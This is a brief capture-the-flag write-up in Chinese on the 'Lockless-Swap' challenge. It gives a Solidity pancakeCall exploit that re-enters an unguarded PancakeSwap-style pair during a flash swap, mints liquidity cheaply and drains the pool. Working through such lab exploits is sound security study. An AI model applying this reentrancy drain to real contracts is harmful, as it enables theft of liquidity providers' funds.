# Lockless-Swap
在`LocklessPancakePair.sol`中有注释写: @shou: no more lock protection, needs to prevent attacker sync during swap

所以我们知道这里没有reentrancy Guard，可以进行重入攻击。

```solidity
function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        console.log("pair balance 0:%e", token0.balanceOf(address(pair)));
        console.log("pair balance 1:%e", token1.balanceOf(address(pair)));

        token0.transfer(address(pair), 1e18);
        token1.transfer(address(pair), 1e18);
        pair.mint(address(this));
        token0.transfer(address(pair), 99e18 - 1e10);
        token1.transfer(address(pair), 99e18 - 1e10);
    }
```
大量转出token0和token1，然后转入少量token0和token1获取大量流动性，然后就能把pair抽干